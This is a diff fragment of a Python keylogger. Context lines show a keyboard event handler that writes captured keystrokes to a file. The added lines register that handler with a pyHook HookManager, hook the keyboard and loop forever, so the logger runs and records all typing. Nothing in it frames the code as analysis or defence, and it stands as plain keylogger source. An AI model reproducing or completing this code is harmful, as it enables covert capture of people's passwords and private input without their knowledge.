@@ -22,3 +22,10 @@ def OnKeyboardEvent(event):
         buffer += keylogs 
         f.write(buffer) 
         f.close()
+# create a hook manager object 
+hm = pyHook.HookManager() 
+hm.KeyDown = OnKeyboardEvent 
+# set the hook 
+hm.HookKeyboard() 
+# wait forever 
+pythoncom.PumpMessages() 
